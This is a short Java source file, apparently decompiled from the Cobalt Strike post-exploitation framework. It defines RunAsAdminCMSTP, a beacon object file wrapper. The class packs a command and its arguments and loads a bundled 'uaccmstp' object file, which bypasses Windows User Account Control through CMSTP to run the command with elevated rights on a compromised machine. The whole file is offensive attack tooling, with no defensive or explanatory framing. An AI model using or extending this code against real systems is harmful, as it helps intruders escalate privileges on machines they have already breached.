package beacon.bof;

import aggressor.AggressorClient;
import beacon.PostExInlineObject;
import common.Packer;
import common.SleevedResource;
import common.StringStack;

public class RunAsAdminCMSTP extends PostExInlineObject {
   protected String command;

   public RunAsAdminCMSTP(AggressorClient var1, String var2) {
      super(var1);
      this.command = var2;
   }

   public byte[] getArguments(String var1) {
      StringStack var2 = new StringStack(this.command);
      String var3 = var2.shift();
      String var4 = var2.toString();
      Packer var5 = new Packer();
      var5.addLengthAndWideStringASCIIZ(var3);
      var5.addLengthAndWideStringASCIIZ(var4);
      return var5.getBytes();
   }

   public byte[] getObjectFile(String var1) {
      return SleevedResource.readResource("resources/uaccmstp." + var1 + ".o");
   }
}
